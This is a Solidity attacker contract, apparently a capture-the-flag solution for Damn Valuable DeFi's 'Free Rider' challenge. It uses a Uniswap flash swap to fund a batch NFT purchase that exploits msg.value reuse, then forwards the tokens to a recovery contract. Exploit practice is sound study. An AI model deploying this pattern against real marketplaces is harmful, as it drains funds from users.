// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./FreeRiderNFTMarketplace.sol";
import "./FreeRiderRecovery.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Callee.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "../DamnValuableNFT.sol";
import "solmate/src/tokens/WETH.sol";

contract FreeRiderAttacker is IUniswapV2Callee, IERC721Receiver {
    IUniswapV2Pair pair;
    FreeRiderNFTMarketplace marketplace;
    address devsContract;
    address player;

    constructor(IUniswapV2Pair _pair, FreeRiderNFTMarketplace _marketplace, address _devsContract, address _player) {
        pair = _pair;
        marketplace = _marketplace;
        devsContract = _devsContract;
        player = _player;
    }

    function attack(uint256 nftPrice) external {
        bytes memory data = abi.encode(nftPrice);
        pair.swap(nftPrice, 0, address(this), data);
    }

    // called by pair contract
    function uniswapV2Call(
        address,
        uint256 amount, // weth amount
        uint256,
        bytes calldata data
    ) external override {
        WETH weth = WETH(payable(pair.token0()));
        weth.withdraw(amount);

        (uint256 nftPrice) = abi.decode(data, (uint256));
        uint256 offerCount = marketplace.offersCount();
        uint256[] memory tokenIds = new uint256[](offerCount);
        for (uint256 i = 0; i < offerCount;) {
            tokenIds[i] = i;
            unchecked {
                i++;
            }
        }
        marketplace.buyMany{value: nftPrice}(tokenIds);
        DamnValuableNFT nft = DamnValuableNFT(marketplace.token());

        for (uint256 i = 0; i < offerCount;) {
            bytes memory recipient = abi.encode(player);
            nft.safeTransferFrom(address(this), devsContract, i, recipient);
            unchecked {
                i++;
            }
        }

        uint256 amountToRepay = amount * 103 / 100;
        weth.deposit{value: amountToRepay}();
        ERC20(weth).transfer(address(pair), amountToRepay);
    }

    function onERC721Received(
        address,
        address,
        uint256,
        bytes memory
    ) external pure override returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable {}

}